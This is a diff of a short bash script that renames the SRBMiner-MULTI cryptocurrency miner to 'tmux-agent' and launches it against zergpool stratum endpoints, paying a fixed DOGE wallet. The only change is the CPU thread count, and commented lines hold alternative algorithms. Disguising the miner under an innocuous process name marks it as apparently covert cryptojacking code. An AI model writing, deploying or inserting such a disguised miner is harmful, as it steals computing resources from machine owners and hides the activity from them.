@@ -1,5 +1,5 @@
 #!/bin/bash
-mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm minotaurx --pool stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE,mc=MAZA --keepalive true --cpu-threads 4
+mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm minotaurx --pool stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE,mc=MAZA --keepalive true --cpu-threads 3
 #mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm curvehash --pool stratum+tcp://curvehash.mine.zergpool.com:3343 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE,mc=PLSR --keepalive true --cpu-threads 4
 #mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm dynamo --pool stratum+tcp://dynamo.mine.zergpool.com:4234 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE --keepalive true --cpu-threads 4
 #mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm 0x10 --pool stratum+tcp://0x10.mine.zergpool.com:8336 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE --keepalive true --cpu-threads 4
